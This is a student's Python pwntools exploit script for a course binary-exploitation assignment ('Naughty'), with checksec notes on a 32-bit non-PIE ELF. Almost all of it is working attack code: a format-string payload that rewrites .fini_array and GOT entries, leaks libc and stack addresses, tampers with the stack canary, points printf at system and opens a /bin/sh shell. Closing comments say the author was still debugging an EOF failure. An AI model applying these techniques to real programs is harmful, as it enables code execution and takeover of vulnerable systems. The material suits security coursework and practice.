'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP19: Naughty
File Description:  sing .fini_array similar to GOT exploit to call system

Checksec info:
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

    Interesting, no PIE and is 32bit

File info:
naughty: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter 
/lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c1f697613751decab2357b9854929211627742a8, not stripped

    I like dynamically linked, means it links everyting via lazy linking
    
Radare2:
afl --> list all functions

Useful Funcs

'''

from pwn import *

context(arch='i386')
bin = ELF('./naughty')
libc = ELF('libc-2.27.so')
p = process("./naughty")

p.recvuntil(b'name?\n')
write1 = {0x08049bac:bin.symbols['main']}
payload = fmtstr_payload(7, write1) + b"pepega %2$p poggers %81$p" #pepega is my marker for libc, poggers is my marker for stack
print(payload)
p.sendline(payload)
p.recvuntil(b'pepega ')
leak = int(p.recv(10), 16)
libc.address = leak - libc.symbols['_IO_2_1_stdin_']
log.info("Leak: " + hex(leak))
log.info("Base: " + hex(libc.address))

p.recvuntil(b'poggers ')
canary = int(p.recv(10), 16) - 408 #offset from this stack leak to canary
log.info("Canary address: " + hex(canary))


write2 = {canary:0xdeadbeef, bin.got['__stack_chk_fail']:bin.symbols['main'], bin.got['printf']:libc.symbols['system']}
payload = fmtstr_payload(7, write2)
p.recvuntil(b'name?\n')
p.sendline(payload)
p.recv()
# p.recvuntil(b'name?\n')
p.sendline(b"/bin/sh")
p.interactive()

# Attemptying to debug why nothing was working; originally, binary was messed up.
# Now Receiving EOF attempting debug